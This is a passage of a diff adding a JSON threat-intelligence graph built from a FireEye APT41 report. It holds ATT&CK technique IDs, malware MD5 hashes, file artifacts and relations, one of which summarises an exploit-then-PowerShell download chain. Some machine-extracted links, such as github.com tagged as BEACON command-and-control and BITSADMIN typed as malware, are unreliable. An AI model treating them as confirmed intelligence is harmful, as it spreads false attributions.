+      "value": "https://github.com/skywind3000/kcp",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_191",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_technique_T1050",
+      "type": "Technique",
+      "name": "T1050",
+      "normalized_name": "T1050",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_131",
+        "ev_51"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "technique_id": "T1050",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_131",
+      "supporting_evidence_ids": [
+        "ev_51"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "observed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "observed_technique"
+    },
+    {
+      "id": "ent_technique_T1055",
+      "type": "Technique",
+      "name": "T1055",
+      "normalized_name": "T1055",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_133",
+        "ev_52"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "technique_id": "T1055",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_133",
+      "supporting_evidence_ids": [
+        "ev_52"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "observed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "observed_technique"
+    },
+    {
+      "id": "ent_technique_T1064",
+      "type": "Technique",
+      "name": "T1064",
+      "normalized_name": "T1064",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_130",
+        "ev_51"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "technique_id": "T1064",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_130",
+      "supporting_evidence_ids": [
+        "ev_51"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "observed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "observed_technique"
+    },
+    {
+      "id": "ent_technique_T1065",
+      "type": "Technique",
+      "name": "T1065",
+      "normalized_name": "T1065",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_134",
+        "ev_52"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "technique_id": "T1065",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_134",
+      "supporting_evidence_ids": [
+        "ev_52"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "observed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "observed_technique"
+    },
+    {
+      "id": "ent_technique_T1068",
+      "type": "Technique",
+      "name": "T1068",
+      "normalized_name": "T1068",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_132",
+        "ev_51"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "technique_id": "T1068",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_132",
+      "supporting_evidence_ids": [
+        "ev_51"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "observed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "observed_technique"
+    },
+    {
+      "id": "ent_technique_T1071",
+      "type": "Technique",
+      "name": "T1071",
+      "normalized_name": "T1071",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_134",
+        "ev_52"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "technique_id": "T1071",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_134",
+      "supporting_evidence_ids": [
+        "ev_52"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "observed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "observed_technique"
+    },
+    {
+      "id": "ent_technique_T1086",
+      "type": "Technique",
+      "name": "T1086",
+      "normalized_name": "T1086",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_130",
+        "ev_51"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "technique_id": "T1086",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_130",
+      "supporting_evidence_ids": [
+        "ev_51"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "observed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "observed_technique"
+    },
+    {
+      "id": "ent_technique_T1094",
+      "type": "Technique",
+      "name": "T1094",
+      "normalized_name": "T1094",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_134",
+        "ev_52"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "technique_id": "T1094",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_134",
+      "supporting_evidence_ids": [
+        "ev_52"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "observed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "observed_technique"
+    },
+    {
+      "id": "ent_technique_T1105",
+      "type": "Technique",
+      "name": "T1105",
+      "normalized_name": "T1105",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_134",
+        "ev_52"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "technique_id": "T1105",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_134",
+      "supporting_evidence_ids": [
+        "ev_52"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "observed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "observed_technique"
+    },
+    {
+      "id": "ent_technique_T1132",
+      "type": "Technique",
+      "name": "T1132",
+      "normalized_name": "T1132",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_134",
+        "ev_52"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "technique_id": "T1132",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_134",
+      "supporting_evidence_ids": [
+        "ev_52"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "observed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "observed_technique"
+    },
+    {
+      "id": "ent_technique_T1133",
+      "type": "Technique",
+      "name": "T1133",
+      "normalized_name": "T1133",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_129",
+        "ev_50"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "technique_id": "T1133",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_50",
+      "supporting_evidence_ids": [
+        "ev_129"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "mapped_or_listed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "mapped_or_listed_technique"
+    },
+    {
+      "id": "ent_technique_T1190",
+      "type": "Technique",
+      "name": "T1190",
+      "normalized_name": "T1190",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_129",
+        "ev_50"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "technique_id": "T1190",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_50",
+      "supporting_evidence_ids": [
+        "ev_129"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "mapped_or_listed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "mapped_or_listed_technique"
+    },
+    {
+      "id": "ent_technique_T1197",
+      "type": "Technique",
+      "name": "T1197",
+      "normalized_name": "T1197",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_133",
+        "ev_52"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "technique_id": "T1197",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_133",
+      "supporting_evidence_ids": [
+        "ev_52"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "observed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "observed_technique"
+    },
+    {
+      "id": "ent_technique_T1436",
+      "type": "Technique",
+      "name": "T1436",
+      "normalized_name": "T1436",
+      "aliases": [],
+      "confidence": 0.98,
+      "evidence_ids": [
+        "ev_134",
+        "ev_52"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "technique_id": "T1436",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_134",
+      "supporting_evidence_ids": [
+        "ev_52"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "technique_scope": "observed",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "observed_technique"
+    },
+    {
+      "id": "ent_ioc_md5_013f3bde3f1022b6cf3f2e541d19353c",
+      "type": "MD5",
+      "name": "013f3bde3f1022b6cf3f2e541d19353c",
+      "normalized_name": "013f3bde3f1022b6cf3f2e541d19353c",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_179"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "013f3bde3f1022b6cf3f2e541d19353c",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_179",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_09e4e6fa85b802c46bc121fcaecc5666",
+      "type": "MD5",
+      "name": "09e4e6fa85b802c46bc121fcaecc5666",
+      "normalized_name": "09e4e6fa85b802c46bc121fcaecc5666",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_169"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "09e4e6fa85b802c46bc121fcaecc5666",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_169",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_155e98e5ca8d662fad7dc84187340cbc",
+      "type": "MD5",
+      "name": "155e98e5ca8d662fad7dc84187340cbc",
+      "normalized_name": "155e98e5ca8d662fad7dc84187340cbc",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_113",
+        "ev_15",
+        "ev_73"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "155e98e5ca8d662fad7dc84187340cbc",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_73",
+      "supporting_evidence_ids": [
+        "ev_15",
+        "ev_113"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_3e856162c36b532925c8226b4ed3481c",
+      "type": "MD5",
+      "name": "3e856162c36b532925c8226b4ed3481c",
+      "normalized_name": "3e856162c36b532925c8226b4ed3481c",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_101",
+        "ev_117",
+        "ev_28"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "3e856162c36b532925c8226b4ed3481c",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_101",
+      "supporting_evidence_ids": [
+        "ev_28",
+        "ev_117"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_5909983db4d9023e4098e56361c96a6f",
+      "type": "MD5",
+      "name": "5909983db4d9023e4098e56361c96a6f",
+      "normalized_name": "5909983db4d9023e4098e56361c96a6f",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_115",
+        "ev_89"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "5909983db4d9023e4098e56361c96a6f",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_89",
+      "supporting_evidence_ids": [
+        "ev_115"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_659bd19b562059f3f0cc978e15624fd9",
+      "type": "MD5",
+      "name": "659bd19b562059f3f0cc978e15624fd9",
+      "normalized_name": "659bd19b562059f3f0cc978e15624fd9",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_104",
+        "ev_118"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "659bd19b562059f3f0cc978e15624fd9",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_104",
+      "supporting_evidence_ids": [
+        "ev_118"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_71cdba3859ca8bd03c1e996a790c04f9",
+      "type": "MD5",
+      "name": "71cdba3859ca8bd03c1e996a790c04f9",
+      "normalized_name": "71cdba3859ca8bd03c1e996a790c04f9",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_174"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "71cdba3859ca8bd03c1e996a790c04f9",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_174",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_7966c2c546b71e800397a67f942858d0",
+      "type": "MD5",
+      "name": "7966c2c546b71e800397a67f942858d0",
+      "normalized_name": "7966c2c546b71e800397a67f942858d0",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_24"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "7966c2c546b71e800397a67f942858d0",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_24",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_c0c467c8e9b2046d7053642cc9bdd57d",
+      "type": "MD5",
+      "name": "c0c467c8e9b2046d7053642cc9bdd57d",
+      "normalized_name": "c0c467c8e9b2046d7053642cc9bdd57d",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_112",
+        "ev_76"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "value": "c0c467c8e9b2046d7053642cc9bdd57d",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_76",
+      "supporting_evidence_ids": [
+        "ev_112"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_file_2.exe",
+      "type": "File",
+      "name": "2.exe",
+      "normalized_name": "2.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_101",
+        "ev_102",
+        "ev_28",
+        "ev_29"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "file_name": "2.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_101",
+      "supporting_evidence_ids": [
+        "ev_28",
+        "ev_29",
+        "ev_102"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "malicious_component",
+      "family_hints": [
+        "BEACON",
+        "HTTP"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_install.bat",
+      "type": "File",
+      "name": "install.bat",
+      "normalized_name": "install.bat",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_21",
+        "ev_22",
+        "ev_81",
+        "ev_89"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "file_name": "install.bat",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_89",
+      "supporting_evidence_ids": [
+        "ev_81",
+        "ev_21",
+        "ev_22"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "offensive_tool_or_utility",
+      "family_hints": [
+        "BEACON"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_java.exe",
+      "type": "File",
+      "name": "java.exe",
+      "normalized_name": "java.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_119",
+        "ev_25",
+        "ev_88"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "file_name": "java.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_88",
+      "supporting_evidence_ids": [
+        "ev_119",
+        "ev_25"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_loader_X86_svchost.dll",
+      "type": "File",
+      "name": "loader_X86_svchost.dll",
+      "normalized_name": "loader_X86_svchost.dll",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_137"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "file_name": "loader_X86_svchost.dll",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_137",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "indicator_artifact",
+      "family_hints": [
+        "BEACON"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_logger.zip",
+      "type": "File",
+      "name": "logger.zip",
+      "normalized_name": "logger.zip",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_22",
+        "ev_79",
+        "ev_81"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "file_name": "logger.zip",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_81",
+      "supporting_evidence_ids": [
+        "ev_22",
+        "ev_79"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_svchost.exe",
+      "type": "File",
+      "name": "svchost.exe",
+      "normalized_name": "svchost.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_94"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "file_name": "svchost.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_94",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "abused_legitimate_file",
+      "is_likely_legitimate": true,
+      "family_hints": [
+        "SERVICE_NAME",
+        "DISPLAY_NAME"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_x32.dat",
+      "type": "File",
+      "name": "x32.dat",
+      "normalized_name": "x32.dat",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_146"
+      ],
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "file_name": "x32.dat",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_146",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "config_or_data",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_storescyncsvc.dll",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "File",
+      "name": "storescyncsvc.dll",
+      "normalized_name": "storescyncsvc.dll",
+      "aliases": [],
+      "confidence": 0.83,
+      "evidence_ids": [
+        "ev_28"
+      ],
+      "sources": [
+        "event_derive"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact",
+      "file_name": "storescyncsvc.dll",
+      "file_role": "file_artifact"
+    },
+    {
+      "id": "ent_file_Certutil.exe",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "File",
+      "name": "Certutil.exe",
+      "normalized_name": "Certutil.exe",
+      "aliases": [],
+      "confidence": 0.83,
+      "evidence_ids": [
+        "ev_42"
+      ],
+      "sources": [
+        "event_derive"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact",
+      "file_name": "Certutil.exe",
+      "file_role": "file_artifact"
+    }
+  ],
+  "relations": [
+    {
+      "id": "rel_0001",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "alias_of",
+      "head_id": "ent_malware_storesyncsvc.dll",
+      "tail_id": "ent_malware_Storesyncsvc",
+      "head_type": "Malware",
+      "tail_type": "Malware",
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_21",
+        "ev_22"
+      ],
+      "primary_evidence_id": "ev_21",
+      "direction": "head_to_tail",
+      "extraction_method": "projection_alias",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "alias_of",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": null,
+        "notes": "alias_from_entity",
+        "schema_version": "v3.1-projector"
+      }
+    },
+    {
+      "id": "rel_0002",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "alias_of",
+      "head_id": "ent_tool_BITSADMIN.EXE",
+      "tail_id": "ent_malware_BITSADMIN",
+      "head_type": "Malware",
+      "tail_type": "Malware",
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_119",
+        "ev_121"
+      ],
+      "primary_evidence_id": "ev_119",
+      "direction": "head_to_tail",
+      "extraction_method": "projection_alias",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "alias_of",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": null,
+        "notes": "alias_from_entity",
+        "schema_version": "v3.1-projector"
+      }
+    },
+    {
+      "id": "rel_0003",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "communicates_with",
+      "head_id": "ent_malware_BEACON",
+      "tail_id": "ent_domain_github.com",
+      "head_type": "Malware",
+      "tail_type": "Domain",
+      "confidence": 0.88,
+      "evidence_ids": [
+        "ev_190",
+        "ev_192"
+      ],
+      "primary_evidence_id": "ev_190",
+      "direction": "head_to_tail",
+      "extraction_method": "event_refiner",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "communicates_with",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "command_and_control",
+        "notes": "event_comm",
+        "schema_version": "v4.0-event-refiner"
+      }
+    },
+    {
+      "id": "rel_0004",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "downloads",
+      "head_id": "ent_file_logger.zip",
+      "tail_id": "ent_file_install.bat",
+      "head_type": "File",
+      "tail_type": "File",
+      "confidence": 0.8,
+      "evidence_ids": [
+        "ev_22"
+      ],
+      "primary_evidence_id": "ev_22",
+      "direction": "head_to_tail",
+      "extraction_method": "llm_sentence",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "downloads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "command_and_control",
+        "notes": "download_head",
+        "schema_version": "v3.0-evidence-reasoner",
+        "evidence_span": "In the first variation the CVE-2020-10189 exploit was used to directly upload “logger.zip”, a simple Java based program, which contained a set of commands to use PowerShell to download and execute install.bat and storesyncsvc.dll."
+      },
+      "head": {
+        "id": "ent_file_logger.zip",
+        "type": "File",
+        "name": "logger.zip",
+        "normalized_name": "logger.zip",
+        "aliases": [],
+        "confidence": 0.94,
+        "evidence_ids": [
+          "ev_22",
+          "ev_79",
+          "ev_81"
+        ],
+        "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+        "file_name": "logger.zip",
+        "sources": [
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_81",
+        "supporting_evidence_ids": [
+          "ev_22",
+          "ev_79"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "file_role": "file_artifact",
+        "entity_scope": "supporting",
+        "core_observation": false,
+        "observation_kind": "supporting_file_artifact"
+      },
+      "tail": {
+        "id": "ent_file_install.bat",
+        "type": "File",
+        "name": "install.bat",
+        "normalized_name": "install.bat",
+        "aliases": [],
+        "confidence": 0.94,
+        "evidence_ids": [
+          "ev_21",
+          "ev_22",
+          "ev_81",
+          "ev_89"
+        ],
+        "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+        "file_name": "install.bat",
+        "sources": [
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_89",
+        "supporting_evidence_ids": [
+          "ev_81",
+          "ev_21",
+          "ev_22"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "file_role": "offensive_tool_or_utility",
+        "family_hints": [
+          "BEACON"
+        ],
+        "entity_scope": "supporting",
+        "core_observation": false,
+        "observation_kind": "supporting_file_artifact"
+      }
+    },
+    {
+      "id": "rel_0005",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "type": "downloads",
+      "head_id": "ent_malware_BEACON",
+      "tail_id": "ent_file_2.exe",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.82,
+      "evidence_ids": [
+        "ev_28",
+        "ev_29",
+        "ev_101"
+      ],
+      "primary_evidence_id": "ev_28",
+      "direction": "head_to_tail",
+      "extraction_method": "rule_sentence",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "downloads",
+        "negated": false,
+        "cross_sentence": true,
+        "stage": "command_and_control",
+        "notes": "report_download_support",
+        "schema_version": "v3.2-report-recovery",
+        "evidence_span": "ev_28"
+      },
+      "head": {
+        "id": "ent_malware_BEACON",
+        "type": "Malware",
+        "name": "BEACON",
+        "normalized_name": "BEACON",
+        "aliases": [],
+        "confidence": 0.93,
+        "evidence_ids": [
+          "ev_27",
+          "ev_28",
+          "ev_29",
+          "ev_31"
+        ],
+        "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+        "family": "BEACON",
+        "sources": [
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_27",
+        "supporting_evidence_ids": [
+          "ev_29",
+          "ev_28",
+          "ev_31"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "entity_scope": "core",
+        "core_observation": true
+      },
+      "tail": {
+        "id": "ent_file_2.exe",
+        "type": "File",
+        "name": "2.exe",
+        "normalized_name": "2.exe",
+        "aliases": [],
+        "confidence": 0.94,
+        "evidence_ids": [
+          "ev_101",
+          "ev_102",
+          "ev_28",
+          "ev_29"
+        ],
+        "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+        "file_name": "2.exe",
+        "sources": [
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_101",
+        "supporting_evidence_ids": [
+          "ev_28",
+          "ev_29",
